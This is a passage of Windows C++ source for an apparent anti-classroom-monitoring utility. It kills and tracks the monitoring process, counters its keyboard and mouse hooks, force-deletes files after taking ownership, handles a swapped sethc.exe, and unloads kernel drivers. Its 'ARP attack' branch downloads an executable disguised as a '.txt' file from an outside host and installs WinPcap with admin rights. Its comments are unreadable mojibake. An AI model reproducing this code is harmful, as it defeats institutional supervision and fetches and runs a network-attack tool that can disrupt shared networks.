			wchar_t tmpStr[MAX_PATH];
			mywcscpy(tmpStr, L"\"");
			mywcscat(tmpStr, FilePath);
			mywcscat(tmpStr, L"\"");
			mywcscat(tmpStr, Main.GetStr(L"TINotF"));
			if (MessageBox(Main.hWnd, tmpStr, Main.GetStr(L"Info"), MB_YESNO | MB_ICONQUESTION) == 6)goto forcedelete;
		}
		return;
	}
forcedelete:
	TakeOwner(FilePath);

	if (FileType & FILE_ATTRIBUTE_DIRECTORY)
	{
		wchar_t DirectoryName[MAX_PATH];//���ļ���
		mywcscpy(DirectoryName, FilePath);//SHFileOperationҪ���ַ��������λ����NULL,
		SearchTool(DirectoryName, 3);//�ڳ���ɾ������ļ�ʱ��
		MyRemoveDirectory(DirectoryName);//ֱ����ԭ�ַ����ϲ���һ���������
	}
	else
		MyDeleteFile(FilePath);//���ļ���ֱ��ɾ��
}

BOOL UninstallSethc()//�ָ�ԭ����sethc.
{//���ǳ��õĺ���������������ʷԭ�򣩻��Ǳ���������
	DeleteFile(SethcPath);//��ʱsethc��ɾ����һ�Σ�Ӧ����ӵ��������Ȩ
	if (!CopyFile(L"C:\\SAtemp\\sethc", SethcPath, FALSE)) { Main.InfoBox(L"USFail"); return FALSE; }//�ָ�sethcʧ��?
	else { Main.InfoBox(L"suc"); SethcState = TRUE; return TRUE; }
}

void RegMouseKey()//ע����̿��������ȼ�.
{
	AutoRegisterHotKey(Main.hWnd, MAIN_HOTKEY_LEFTKEY, MOD_ALT, 188);//���
	AutoRegisterHotKey(Main.hWnd, MAIN_HOTKEY_RIGHTKEY, MOD_ALT, 190);//�Ҽ�
	AutoRegisterHotKey(Main.hWnd, MAIN_HOTKEY_MOVELEFT, MOD_ALT, VK_LEFT);//����
	AutoRegisterHotKey(Main.hWnd, MAIN_HOTKEY_MOVEUP, MOD_ALT, VK_UP);//����
	AutoRegisterHotKey(Main.hWnd, MAIN_HOTKEY_MOVERIGHT, MOD_ALT, VK_RIGHT);//����
	AutoRegisterHotKey(Main.hWnd, MAIN_HOTKEY_MOVEDOWN, MOD_ALT, VK_DOWN);//����
}
__forceinline void UnMouseKey() { for (int i = MAIN_HOTKEY_LEFTKEY; i <= MAIN_HOTKEY_MOVEDOWN; ++i)AutoUnregisterHotKey(Main.hWnd, i); }//ע���ȼ�.

LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam) { return CallNextHookEx(MouseHook, nCode, wParam, lParam); }//�յ�ȫ�ֹ��Ӻ���
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) { return CallNextHookEx(KeyboardHook, nCode, wParam, lParam); }//��ֹ����ס��Щ

DWORD WINAPI DeleteThread(LPVOID pM)
{//ɾ���ļ�(��)���߳�.
	(pM);//��ֹɾ��һ�������ļ���ʱ�����濨�ٹ���
	//try
	{
		const int len = mywcslen(Main.Edit[EDIT_FILEVIEW].str);
		if (len < 5)return 0;
		int prv = 0;
		//s(sizeof(wchar_t) * len);
		HANDLE hHeap = HeapCreate(HEAP_NO_SERIALIZE, 0, 0);
		if (!hHeap)return 0;
		wchar_t* Tempstr = (wchar_t*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(wchar_t) * len);
		if (Tempstr == 0)return 0;
		mywcscpy(Tempstr, Main.Edit[EDIT_FILEVIEW].str);
		mywcscpy(Main.Button[BUT_DELETE].Name, Main.GetStr(L"deleting"));
		Main.EnableButton(BUT_DELETE, FALSE);
		//s(Tempstr);
		if (mywcsstr(Tempstr, L"|") == 0)AutoDelete(Tempstr, FALSE);
		else
		{

			for (int i = 0; i < len - 1; ++i)
				if (Tempstr[i] == L'|')
				{//����ÿһ���ַ���
					Tempstr[i] = 0;
					//s(&Tempstr[prv]);
					AutoDelete(&Tempstr[prv], FALSE);
					prv = i + 1;
				}
		}
		mywcscpy(Main.Button[BUT_DELETE].Name, Main.GetStr(L"deleted"));
		Main.EnableButton(BUT_DELETE, TRUE);
		HeapDestroy(hHeap);//��˵���Բ���HeapFree
		//GlobalUnlock(hg);
		//GlobalFree(hg);

		return 0;
	}

}

DWORD WINAPI GameThread(LPVOID pM)
{
	UNREFERENCED_PARAMETER(pM);
	if (Main.Width < 700)
	{//չ������
		GameButtonLock = TRUE;//�����߳���
		for (int j = 20; j <= 240; j += GAMINGSPEED)
		{
			Main.Width += GAMINGSPEED;
			::SetWindowPos(Main.hWnd, NULL, 0, 0, (int)((DEFAULT_WIDTH + j) * Main.DPI), (int)(Main.Height * Main.DPI - 0.5), SWP_NOMOVE | SWP_NOREDRAW | SWP_NOZORDER);
			RECT Rc{ (long)((511) * Main.DPI) ,0,(long)(Main.Width * Main.DPI) ,(long)(Main.Height * Main.DPI - 0.5) };
			Main.Button[BUT_CLOSE].Left += GAMINGSPEED;//����"�رհ�ť"
			Main.es[++Main.es[0].top] = Rc;
			Main.Redraw(Rc);//�ػ�չ������
			if (UTState)UTrc.right += (int)(GAMINGSPEED * Main.DPI);
			Sleep(1);
		}
		if (UTState)UTrc.right -= (int)(GAMINGSPEED * Main.DPI);
		Main.Width = DEFAULT_WIDTH + 240;
	}
	else
	{//������Ϸ����
		//�����Ͼ��Ƿ�����
		for (int j = 20; j <= 240; j += GAMINGSPEED)
		{
			::SetWindowPos(Main.hWnd, NULL, 0, 0, (int)((Main.Width - j) * Main.DPI), (int)(Main.Height * Main.DPI - 0.5), SWP_NOMOVE | SWP_NOREDRAW | SWP_NOZORDER);
			RECT Rc{ (long)((511) * Main.DPI) ,0,(long)(Main.Width * Main.DPI) ,(long)(Main.Height * Main.DPI - 0.5) };
			Main.Button[BUT_CLOSE].Left -= GAMINGSPEED;
			Main.Redraw(Rc);
			if (UTState)UTrc.right -= (int)(GAMINGSPEED * Main.DPI);
			Sleep(1);
		}
		Main.Width = DEFAULT_WIDTH;
		if (UTState)UTrc.right = UTrc.left + (int)(DEFAULT_WIDTH * Main.DPI);
	}
	GameButtonLock = FALSE;//�ر��߳���
	return 0;
}
BOOL DownloadGames(const wchar_t* url, const wchar_t* file, DownloadProgress* p, int ButID, int tot, int cur, int maxs)
{//����(��Ϸ)
	wchar_t Fp[501], URL[121];
	mywcscpy(Fp, L"C:\\SAtemp\\Games\\");
	mywcscat(Fp, url);//ƴ������Ŀ¼��ԴĿ¼
	mywcscpy(URL, GameURLprefix);
	mywcscat(URL, file);
	mywcscat(URL, L"qk.txt");
	if (ButID != NULL)
	{
		Main.Button[ButID].Download = 1;
		Main.Button[ButID].DownTot = tot;
		Main.Button[ButID].DownCur = cur;
		p->curi = ButID;
		p->factmax = maxs;
	}
	return URLDownloadToFileW(NULL, URL, Fp, 0, p) == S_OK;
}
DWORD WINAPI DownloadThread(LPVOID pM)//�ַ�����(��Ϸ)������߳�.
{
	int cur = *(int*)pM;
	BOOL f = FALSE;
	DownloadProgress progress;
	progress.curi = progress.factmax = 0;
	switch (cur)
	{
	case 1:
		f = DownloadGames(GameName[0], GameURLsuffix[0], &progress, BUT_GAME1, 2, 1, 0);//1��С��Ϸ��2���ļ�Ҫ���⴦��
		DownloadGames(GameName[6], GameURLsuffix[6], &progress, BUT_GAME1, 2, 2, 899000);//14000�ʿ�.ini
		break;//	����ĳЩԭ���޷��õ������ļ���С��Ҫ��2��������
	case 2:case 3:case 4:case 5:case 6:
		//���ص�2~6����Ϸ
		f = DownloadGames(GameName[cur - 1], GameURLsuffix[cur - 1], &progress, BUT_GAME1 + cur - 1, 1, 1, 0);
		break;
	case 7:
	{//ARP attack
		BOOL WPinstalled = TRUE;
		const wchar_t WPPath[] = L"C:\\SAtemp\\WinPcap.exe";
		progress.curi = BUT_ARP;
		if (GetFileAttributes(L"C:\\Windows\\System32\\wpcap.dll") == -1)//WinPcapδ��װ
		{
			if (!Main.YesNoBox(L"WPAsk"))return 0;
			//�Ƿ�ͬ������һ��?
			WPinstalled = FALSE;
			Main.Button[BUT_ARP].Download = Main.Button[BUT_ARP].DownCur = 1;
			Main.Button[BUT_ARP].DownTot = 2;
			if (URLDownloadToFileW(NULL, L"http://download.skycn.com/hao123-soft-online-bcs/soft/W/WinPcap_4.1.3.exe", WPPath, 0, &progress) == S_OK)RunWithAdmin((LPWSTR)WPPath);
			else return 0;//���غ��Թ���Ա�������
		}
		Main.Button[BUT_ARP].Download = 1;
		Main.Button[BUT_ARP].DownTot = Main.Button[BUT_ARP].DownCur = 2 - (int)WPinstalled;//����arp.exe(���Զ�����)
		//s(1);
		if (URLDownloadToFileW(NULL, L"http://www.zlian.ga/u/1599378482qk.txt", L"C:\\SAtemp\\arp.exe", 0, &progress) != S_OK)return 0;
		break;
	}
	default:return 0;
	}
	GameExist[cur - 1] = f;
	return 0;
}

bool LanguageSearched = false;
void SearchLanguageFiles()//�ڵ�ǰĿ¼��Ѱ�������ļ�
{
	if (LanguageSearched)return;
	LanguageSearched = true;

	SendMessage(FileList, LB_RESETCONTENT, 0, 0);//��Ѱ�����ļ�ǰ���listbox
	wchar_t szFind[MAX_PATH];
	WIN32_FIND_DATA FindFileData;
	mywcscpy(szFind, TDTempPath);
	mywcscat(szFind, L"language\\*.ini");

	HANDLE hFind = ::FindFirstFile((LPCWSTR)szFind, &FindFileData);
	if (INVALID_HANDLE_VALUE == hFind)return;
	while (TRUE)//Ѱ��
	{
		if (!(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))//�ҵ�������Ϣ��FileList���
			SendMessage(FileList, LB_ADDSTRING, 0, (LPARAM)FindFileData.cFileName);
		if (!FindNextFile(hFind, &FindFileData))break;
	}//�ҵ����һ�������
	FindClose(hFind);
}

DWORD WINAPI FakeNewThread(LPVOID pM)
{//����αװ������(��)�������� or ���صĽ���
	if (FakeThreadLock)  return 0;//�����߳���
	FakeThreadLock = TRUE;
	const int offset = *(int*)pM;
	RECT rc;
	GetWindowRect(FakeWnd, &rc);
	for (int i = 1; i <= 30; ++i)
	{
		Sleep(10);//��������
		SetWindowPos(FakeWnd, 0, rc.left, rc.top + i * 2 * offset, 0, 0, SWP_NOSIZE | SWP_NOZORDER);
	}
	if (!FakeToolbarNew)SetWindowPos(FakeWnd, 0, rc.left, 0, 0, 0, SWP_NOSIZE | SWP_NOZORDER);
	FakeThreadLock = FALSE;//�ر��߳���
	return 0;
}

BOOL CALLBACK CatchThread(HWND hwnd, LPARAM lParam)//��׽����.
{
	UNREFERENCED_PARAMETER(lParam);
	ULONG nProcessID;
	if (GetParent(hwnd) == 0)
	{//����Ƕ�������(û�и����ڵĴ���)
		::GetWindowThreadProcessId(hwnd, &nProcessID);//�����ڱ����������ҿɼ�
		if (Eatpid[nProcessID] == TRUE && IsWindowVisible(hwnd))
		{
			RECT rc, rc2;
			GetWindowRect(hwnd, &rc);
			if (rc.bottom<0 || rc.right<0 || rc.left> xLength || rc.top>yLength)return 1;//������Ļ��Χ�ڵĴ��ڽ�������׽
			if (rc.right - rc.left < 15 || rc.bottom - rc.top < 15)return 1;//��С�Ĵ��ڽ�������׽
			if (SetParent(hwnd, CatchWnd) != NULL)
			{
				++EatList[0];//��׽����hWnd���뵽EatList��
				EatList[((size_t)EatList[0]) / 4] = hwnd;
				GetClientRect(CatchWnd, &rc2);
				GetWindowRect(hwnd, &rc);
				if (rc.top >= rc2.bottom || rc.left >= rc2.right)SetWindowPos(hwnd, NULL, 0, 0, 0, 0, SWP_NOREDRAW | SWP_NOSIZE);
			}
		}
	}
	return 1;
}

void ULTRATopMost()//����"�����ö�"
{//������½���һ��"�����ö�"��һ����
	UTState = TRUE;//"�����ö�"���UT,��һ�����(������DirectUI�ļ���)�ļ���
	Main.noMsgbox = TRUE;//"�����ö�"��������Ͳ���һ�����ڡ���ֱ�ӽ����õ�ͼ���ӡ����ĻDC�ϡ�
	Deskwnd = GetDesktopWindow();//�������Ƶ�ͼ�����"�ƹ�"���ڹ���ϵͳ��ֱ�������������档
	GetWindowRect(Main.hWnd, &UTrc);//���ǣ������Ĵ����������ڹ���ϵͳ������Ϣ����WM_MOUSEMOVE�ȣ�
	Main.CreateFrame(180, 410, 264, 113, 5, L"");//UT�����˴��ں�ֻ��ͨ����ʱ����ȡ���λ�ã�
	SetTimer(Main.hWnd, TIMER_UT1, 1, (TIMERPROC)TimerProc);//ͨ��ȫ�ּ��̹��ӻ�ȡ�������Ϣ��
	SetTimer(Main.hWnd, TIMER_UT2, 15, (TIMERPROC)TimerProc);//��������ʮ���鷳
	LButtonDown = KEY_DOWN(VK_LBUTTON);//ͬʱ��û���˴��ڣ�Ҳ��û�����Ӵ��ڵĸ��һ��VC�ϵĿؼ���
	SetLayeredWindowAttributes(Main.hWnd, NULL, 1, LWA_ALPHA);
	Main.Redraw();//��Button,Edit����ͨ�ؼ�������ʹ�á���������Ҫ�ľ����ԡ�
}

void noULTRA()//�ر�UT
{//UT������ʱ���������棬������������MessageBox,���Class���InfoBox��ʱ����ʹ��
	UTState = FALSE; Main.noMsgbox = FALSE;
	--Main.CurFrame;//����������˵��UT����ʱ�޷���ʾList,����������������ʾһ��ռλ�õ�Frame
	KillTimer(Main.hWnd, TIMER_UT1);//�رռ�ʱ��
	KillTimer(Main.hWnd, TIMER_UT2);
	SetLayeredWindowAttributes(Main.hWnd, NULL, 230, LWA_ALPHA);
	SetWindowPos(Main.hWnd, 0, UTrc.left, UTrc.top, UTrc.right - UTrc.left, UTrc.bottom - UTrc.top, SWP_NOREDRAW | SWP_NOZORDER);
	Main.Redraw();
}

void ReturnWindows()//�黹����.
{
	if (TDhWndChild != 0 && TDhWndParent != 0 && TDhWndParent != (HWND)-1)
	{//��CatchWnd��ץ��һ������㲥����ʱ���黹����Ҫ�����⴦��(ͣ����ʱ����)
		KillTimer(Main.hWnd, TIMER_CATCHEDTD);
		SetParent(TDhWndChild, NULL);
		SetWindowPos(TDhWndChild, NULL, 0, 0, xLength, yLength, SWP_NOZORDER);
		TDhWndParent = TDhWndChild = 0;
	}
	for (size_t i = 1; i <= (size_t)(EatList[0]); ++i)SetParent(EatList[i], NULL);
	EatList[0] = 0;
	UpdateCatchedWindows();
}
DWORD WINAPI TopThread(LPVOID pM)//�ö��߳�.
{
	UNREFERENCED_PARAMETER(pM);
	while (TOP == 1)//ѭ����ֱ��ռ��һ��CPU�̣߳��ڽϲ�ĵ��Խ����"�ͻ���"
	{//�����ö�	(�Ȳ���������������˼���CreateWindowWithBand)
		if (HideState) { Sleep(10); continue; }
		SetWindowPos(Main.hWnd, HWND_TOPMOST, 0, 0, 0, 0, 1 | 2);
		if (LowResource)Sleep(1);
		if (CatchWnd != NULL) {//ͬʱ����Main��CatchWnd���������ڲ����ص���һ��ʱ���ص����ֻ���ֲ�����˸������
			if ((TopCount % 50) == 0)SetWindowPos(CatchWnd, HWND_TOPMOST, 0, 0, 0, 0, 1 | 2);//��һ������ʱ�޽⣬
			++TopCount;//������⽵��CatchWnd���ö��ٶ��������"����"~
		}
	}//�˳��߳�ǰǰȡ���ö�
	SetWindowPos(Main.hWnd, HWND_NOTOPMOST, 0, 0, 0, 0, 1 | 2);
	if (CatchWnd != NULL)SetWindowPos(CatchWnd, HWND_NOTOPMOST, 0, 0, 0, 0, 1 | 2);
	return 0;
}

BOOL CatchWindows()//������ʱ����ʽ��ʼ��׽����
{
	wchar_t ExeName[MAX_PATH];
	myZeroMemory(ExeName, sizeof(wchar_t) * MAX_PATH);
	for (int i = 0; i < 3; ++i)if (Main.Edit[EDIT_PROCNAME].str[i] != 0)ExeName[i] = Main.Edit[EDIT_PROCNAME].str[i]; else break;
	mywcslwr(ExeName);
	Map<int, BOOL>::Iterator it = Eatpid.Begin();//���map
	if (it != 0)while (it != Eatpid.End())(*it).second = FALSE, ++it;
	PROCESSENTRY32 pe;
	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	pe.dwSize = sizeof(PROCESSENTRY32);
	if (!Process32First(hSnapShot, &pe))return FALSE;
	while (Process32Next(hSnapShot, &pe))
	{
		pe.szExeFile[3] = 0;//��Ҫ��׽�ĳ����pid�ӽ�ȥ
		mywcslwr(pe.szExeFile);
		if (mywcsstr(ExeName, pe.szExeFile) != 0)Eatpid[pe.th32ProcessID] = TRUE;
	}
	EnumWindows(CatchThread, NULL);
	UpdateCatchedWindows();
	return TRUE;
}
void MyExitProcess()
{//�˳�ǰ��������.
	if (Admin)
	{
		UnloadNTDriver(L"KProcessHacker2");//ж������
		UnloadNTDriver(L"DeleteFile");
	}
	if (UTState)InvalidateRect(Deskwnd, &UTrc, TRUE);
	if (EatList[0] != 0)ReturnWindows();//�黹����
	if (MouseHook != NULL)UnhookWindowsHookEx(MouseHook);//�ر�ȫ�ּ��̹���
	if (KeyboardHook != NULL)UnhookWindowsHookEx(KeyboardHook);
	ExitProcess(0);
}

BOOL RefreshTDstate()//ˢ�¼����״̬
{
	const RECT rc{ (LONG)(165 * Main.DPI), (LONG)(400 * Main.DPI),(LONG)(320 * Main.DPI),(LONG)(505 * Main.DPI) };
	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);//��¼�ż�����̹���frameλ�õ�rc
	wchar_t myTDName[MAX_PATH];
	myZeroMemory(myTDName, sizeof(wchar_t) * MAX_PATH);
	for (int i = 0; i < 3; ++i)myTDName[i] = TDName[i];
	mywcslwr(myTDName);
	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(PROCESSENTRY32);
	if (!Process32First(hSnapShot, &pe))return FALSE;

	while (Process32Next(hSnapShot, &pe))
	{//Ѱ�Ҽ������
		pe.szExeFile[3] = 0;
		mywcslwr(pe.szExeFile);
		if (mywcscmp(myTDName, pe.szExeFile) == 0)
		{//����������
			wchar_t tmpStr[MAX_STR], numStr[MAX_NUM];
			if (TDPID != 0)return TRUE;//����Ѿ�֪��StudentMain.exe��pid���˳�
			TDPID = pe.th32ProcessID;//��������stu��pid
			myZeroMemory(numStr, sizeof(wchar_t) * MAX_NUM);
			mywcscpy(tmpStr, Main.GetStr(L"_TDPID"));
			myitow(TDPID, numStr, 10);
			mywcscat(tmpStr, numStr);
			Main.SetStr(tmpStr, L"TDPID");//����Textʱע�����"10"���ֵ
			mywcscpy(Main.Text[10].Name, L"TcmdOK");
			Main.Text[10].rgb = COLOR_GREENEST;//����һЩ��ť��״̬��Ȼ���ػ�
			Main.Button[BUT_KILLTD].Enabled = TRUE;
			Main.Button[BUT_RETD].Enabled = FALSE;
			Main.Readd(REDRAW_TEXT, 8); Main.Readd(REDRAW_TEXT, 9); Main.Readd(REDRAW_TEXT, 10);
			Main.Readd(REDRAW_BUTTON, BUT_KILLTD);
			Main.Readd(REDRAW_BUTTON, BUT_RETD);
			Main.es[++Main.es[0].top] = rc;
			Main.Redraw(rc);
			return TRUE;
		}
	}
	if (TDPID == 0)return TRUE;
	TDPID = 0;//����ԭ�����ڣ������ڱ�������
	wchar_t tmpStr[MAX_STR];
	mywcscpy(tmpStr, Main.GetStr(L"_TDPID"));
	mywcscat(tmpStr, L"\\");
	Main.SetStr(tmpStr, L"TDPID");
	mywcscpy(Main.Text[10].Name, L"TcmdNO");
	Main.Text[10].rgb = COLOR_RED;//����һЩ��ť��״̬��Ȼ���ػ�
	Main.Button[BUT_RETD].Enabled = TRUE;
	Main.Button[BUT_KILLTD].Enabled = FALSE;
	Main.Readd(REDRAW_TEXT, 8); Main.Readd(REDRAW_TEXT, 9); Main.Readd(REDRAW_TEXT, 10);
	Main.Readd(REDRAW_BUTTON, BUT_KILLTD);
	Main.Readd(REDRAW_BUTTON, BUT_RETD);
	Main.es[++Main.es[0].top] = rc;
	Main.Redraw(rc);
	return TRUE;
}
void CreateDownload(int cur)
{//����������Ϸ�̵߳���Ǻ���.
	CreateThread(NULL, 0, DownloadThread, &cur, 0, NULL);
	Sleep(1);//���߳�����Ҫ�õ�����Ĳ�����
	return;//��ʱ���߳��ڻ�û���ݺò��������߳��ھͰѲ��������
}//�����������ӳ�1ms.

void CALLBACK TimerProc(HWND hWnd, UINT nMsg, UINT nTimerid, DWORD dwTime)//����ʱ��
{
	UNREFERENCED_PARAMETER(hWnd); UNREFERENCED_PARAMETER(nMsg); UNREFERENCED_PARAMETER(dwTime);
	switch (nTimerid)
	{
	case TIMER_KILLPROCESS://������������
	{
		if (Main.Check[CHK_REKILL].Value == 1)
			if (!KillProcess(Main.Edit[EDIT_TDNAME].str))
			{
				Main.Check[CHK_REKILL].Value = 0;
				KillTimer(hWnd, TIMER_KILLPROCESS);//�������� (ȫ��) ʧ�����˳�
				const RECT rc(Main.GetRECTc(CHK_REKILL));
				Main.Readd(REDRAW_CHECK, CHK_REKILL);
				Main.Redraw(rc);
				error();
			}
		break;
	}
	case TIMER_CATCHWINDOW://��ʱ��׽����
	{
		if (--CatchWndTimerLeft > 0)
		{
			if (!IsWindowVisible(CatchWnd))
			{
				CatchWndTimerLeft = -1;
				mywcscpy(Main.Button[BUT_CATCH].Name, Main.GetStr(L"back"));
				Main.EnableButton(BUT_CATCH, TRUE);
				KillTimer(Main.hWnd, TIMER_CATCHWINDOW);
			}
			wchar_t TempString[MAX_STR], TempNumber[MAX_NUM];
			myZeroMemory(TempNumber, sizeof(wchar_t) * MAX_NUM);
			mywcscpy(TempString, Main.GetStr(L"Timer1"));
			myitow(CatchWndTimerLeft, TempNumber, MAX_NUM);
			mywcscat(TempString, TempNumber);
			mywcscat(TempString, Main.GetStr(L"Timer2"));
			mywcscpy(Main.Button[BUT_CATCH].Name, TempString);//ƴ�Ӱ�ť��"ʣ��XX��"������
			Main.EnableButton(BUT_CATCH, FALSE);
		}
		if (CatchWndTimerLeft <= 0)
		{
			CatchWindows();
			KillTimer(Main.hWnd, TIMER_CATCHWINDOW);
			mywcscpy(Main.Button[BUT_CATCH].Name, Main.GetStr(L"back"));
			Main.EnableButton(BUT_CATCH, TRUE);
		}
		break;
	}
	case TIMER_COPYLEFT://copyleft
	{
		if (Main.CurWnd != 4)EasterEggFlag = false, KillTimer(Main.hWnd, TIMER_COPYLEFT);

		EasterEggState = (EasterEggState + 1) % 55;
		wchar_t CopyLeftstr[MAX_STR], Tempstr[10];//�������ֹ���
		mywcscpy(CopyLeftstr, L"Copy");
		myZeroMemory(Tempstr, sizeof(wchar_t) * 10);
		MultiByteToWideChar(CP_ACP, 0, EasterEggStr[(EasterEggState % 55) / 5], -1, Tempstr, 10);
		mywcscat(CopyLeftstr, Tempstr);
		mywcscat(CopyLeftstr, Main.GetStr(L"Tleft"));
		Main.SetStr(CopyLeftstr, L"_Tleft");

		int RGB[3]{ GetRValue(Main.TitleBar.col),GetGValue(Main.TitleBar.col),GetBValue(Main.TitleBar.col) }, a = ColorChangingState < 0 ? -1 : 1;

		RGB[ColorChangingState * a - 1] += (4 + myrand() % 3) * a;
		for (int i = 0; i < 3; ++i)
		{
			if (RGB[i] < 10)RGB[i] = 10, ColorChangingState = i + 1;
			if (RGB[i] >= 245)RGB[i] = 245, ColorChangingState = -i - 1;
		}
		--ColorChangingLeft;
		if (myrand() % 25 == 0 && ColorChangingLeft <= 0)
		{
			ColorChangingLeft = 8;
			int t2 = ColorChangingState;
		useless:
			ColorChangingState = myrand() % 7 - 3;
			if (ColorChangingState == 0 || ColorChangingState == t2 || ColorChangingState == -t2)goto useless;
		}
		if (RGB[0] + RGB[1] + RGB[2] <= 300)Main.Text[29].rgb = COLOR_WHITE;
		if (RGB[0] + RGB[1] + RGB[2] >= 450)Main.Text[29].rgb = COLOR_BLACK;//��ɫ��ǳʱ����Ϊ��ɫ����֮��Ȼ

		Main.SetTitleBar(RGB(RGB[0], RGB[1], RGB[2]), TITLEBAR_HEIGHT);
		Main.Redraw();
		break;
	}
	case TIMER_EXPLAINATION://��ʱ����exp
	{
		if (!--sdl)
		{
			typedef struct tagCHANGEFILTERSTRUCT {//ʹ������ܷǹ���Ա����(explorer)����ק����
				DWORD cbSize;
				DWORD ExtStatus;
			} CHANGEFILTERSTRUCT, * PCHANGEFILTERSTRUCT;
			typedef BOOL(WINAPI* CHANGEWINEOWMESSAGEFILTEREX)(HWND hwnd, UINT message, DWORD action, PCHANGEFILTERSTRUCT pChangeFilterStruct);
			CHANGEWINEOWMESSAGEFILTEREX ChangeWindowMessageFilterEx = NULL;
			HMODULE hModule = GetModuleHandle(L"user32.dll");//����win7�Ժ���е��º���
			if (hModule != NULL)ChangeWindowMessageFilterEx = (CHANGEWINEOWMESSAGEFILTEREX)GetProcAddress(hModule, "ChangeWindowMessageFilterEx");
			if (ChangeWindowMessageFilterEx == NULL)break;
			ChangeWindowMessageFilterEx(Main.hWnd, WM_DROPFILES, 1, 0);
			ChangeWindowMessageFilterEx(Main.hWnd, 0x0049, 1, NULL);

			if (GetSystemDefaultLangID() == 0x0804 && Main.Button[BUT_MORE].Enabled)//����ϵͳ���Զ�"�л�����"����ʾע��
			{
				wchar_t Tempstr[MAX_STR];
				ReleaseLanguageFiles(TDTempPath, 1, Tempstr);
				SwitchLanguage(Tempstr);
			}
		}
		if (GetForegroundWindow() != Main.hWnd)Main.EditUnHotKey();
		if (GetTickCount() - Main.Timer >= 500 && Main.ExpExist == FALSE)Main.Try2CreateExp();
		break;
	}
	case TIMER_BUTTONEFFECT://��ť��Ч
	{
		if (!Main.ButtonEffect)break;
		for (int i = 0; i <= Main.CurButton; ++i)
		{
			if (Main.CoverButton != i && Main.Button[i].Percent > 0)
			{//��������ϵİ�ť��ɫ�𽥱䵭
				Main.Button[i].Percent -= 2 * Delta;
				if (Main.Button[i].Percent < 0)Main.Button[i].Percent = 0;
				Main.ButtonRedraw(i);
			}
		}
		if (Main.CoverButton != -1 && Main.Button[Main.CoverButton].Percent < 100)
		{//������ϵİ�ť��ɫ��˫���ٶȱ���
			Main.Button[Main.CoverButton].Percent += 3 * Delta;
			if (Main.Button[Main.CoverButton].Percent > 100)Main.Button[Main.CoverButton].Percent = 100;
			Main.ButtonRedraw(Main.CoverButton);
		}
		break;
	}
	case TIMER_UPDATECATCH:
		InvalidateRect(CatchWnd, NULL, FALSE);
		UpdateWindow(CatchWnd);
		break;
	case TIMER_ANTIHOOK://ˢ�������̹���
		if (Main.Check[CHK_NOHOOK].Value == 1)
		{//ֻ��������Ĺ��Ӳ���Ч�����������û���ù��������ü�����
			MouseHook = (HHOOK)SetWindowsHookEx(WH_MOUSE_LL, (HOOKPROC)MouseProc, hInst, 0);
			KeyboardHook = (HHOOK)SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyboardProc, hInst, 0);
		}
		break;
	case TIMER_REFRESH_TD://ˢ�¼���״̬
		if (Main.CurWnd == 2)RefreshTDstate();
		break;//250msˢ��һ�Σ�������Ч������
	case TIMER_UPDATEBSOD://ˢ��αװ���������ϵ�����
	{
		BSODstate += 3;
		InvalidateRect(BSODhwnd, NULL, FALSE), UpdateWindow(BSODhwnd);
		DeskDC = GetDC(0);
		if (Main.Check[CHK_OLDBSOD].Value)
			StretchBlt(DeskDC, 0, 0, xLength, yLength, bhdc, 0, 0, 640, 480, SRCCOPY);
		else
			BitBlt(DeskDC, 0, 0, xLength, yLength, bhdc, 0, 0, SRCCOPY);
		ReleaseDC(Deskwnd, DeskDC);
		break;
	}
	case TIMER_TOOLBAR:
		if (GetTickCount() - FakeTimer > 2200)
		{//����뿪Լ3s���ջ�αװ������(��)
			RECT rc;
			GetWindowRect(FakeWnd, &rc);
			if (rc.bottom == 63 && FakeThreadLock == FALSE && FakenewUp == FALSE)
			{
				FakeTimer = GetTickCount();
				FakenewUp = TRUE;
				int typ = -1;//�����ʱ��ֻ���ڴ����߳�
				CreateThread(NULL, 0, FakeNewThread, &typ, 0, NULL);
				Sleep(1);
			}
		}
		break;
	case TIMER_CATCHEDTD://���±������򴰿ڵĴ�С
	{//("�Զ���׽����"�����Ĵ�����CatchWnd�ڣ���˴��ڴ�С��Ӧ������CatchWnd�Ĵ�С�䶯)
		RECT rc;
		GetClientRect(CatchWnd, &rc);
		SetWindowPos(TDhWndChild, 0, 0, 0, rc.right - rc.left, rc.bottom - rc.top, SWP_NOREDRAW);
		if (!IsWindow(TDhWndChild))
		{
			KillTimer(Main.hWnd, TIMER_CATCHEDTD);
			if (TDhWndGrandParent != NULL)DestroyWindow(TDhWndGrandParent), TDhWndGrandParent = 0;//������㲥����ʱ���Զ��ر�CatchWnd
			if ((size_t)EatList[0] < 8) { ReturnWindows(), DestroyWindow(CatchWnd); CatchWnd = 0; }
			TDhWndChild = TDhWndParent = 0;
		}
		break;
	}
	case TIMER_UT1:
	{//����ֱ����ͼ������DC��"����"��Ҫ�������»��ƣ���Ȼ�ᱻ�������ڸ���
		SendMessage(hWnd, WM_PAINT, 0, UT_MESSAGE); break; //�ػ��Ƶ��Խ��Խ��
	}//һ����ʾ��ˢ����Ϊ60fps����ʵ���ϣ�����ʱ�����ٵ���120fps���в����Ч��
	case TIMER_UT2:
	{//���ڻ�������Ϣ�ļ�ʱ��
		SetWindowPos(Main.hWnd, HWND_TOPMOST, UTrc.left, UTrc.top, UTrc.right - UTrc.left, UTrc.bottom - UTrc.top, SWP_NOREDRAW);
		//UT������һ�����ڣ������UT�ϵ����ֱ��"��͸"��ȥ��������ź�ͬʱ���͸���һ�����������
		const BOOL LBnew = KEY_DOWN(VK_LBUTTON);
		BOOL CSinside = FALSE;//Ϊ�˱�����һ�������ｫMain����������ö����պô���UT���·���"�赲"ס����źš�
		POINT point;//Ψһ�������ǣ���UT������"ǿ��"�Ĵ����ö�(�����������)��ʱ��Main�޷�������UT���·�����ʱ����ֵ����͸��bug
		GetCursorPos(&point);
		if (point.x > UTrc.left && point.y > UTrc.top && point.x < UTrc.right && point.y < UTrc.bottom)
			Main.MouseMove(), CSinside = TRUE;
		if (LButtonDown != LBnew && CSinside)
		{//�жϵ���ź���LBUTTONDOWN����LBUTTONUP
